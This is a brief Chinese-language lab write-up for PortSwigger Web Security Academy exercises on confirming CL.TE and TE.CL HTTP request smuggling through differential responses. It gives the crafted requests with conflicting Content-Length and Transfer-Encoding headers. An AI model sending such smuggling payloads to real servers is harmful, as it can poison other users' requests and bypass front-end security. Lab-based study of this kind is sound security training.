## 寻找 HTTP 请求走私漏洞

### 使用差异响应确认 HTTP 请求走私漏洞

#### 使用差异响应确认 CL.TE 漏洞
实验：HTTP 请求走私，通过差异响应确认 CL.TE 漏洞 | Web 安全学院
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

修改首页请求
```
Transfer-Encoding: chunked
Content-Length: 30

0

GET /404 HTTP/1.1
Foo: x
```


#### 使用差异响应确认 TE.CL 漏洞
实验：HTTP 请求走私，通过差异响应确认 TE.CL 漏洞 | Web 安全学院
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

修改首页请求
```
Content-Length: 4
Transfer-Encoding: chunked

58
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 6

0

```







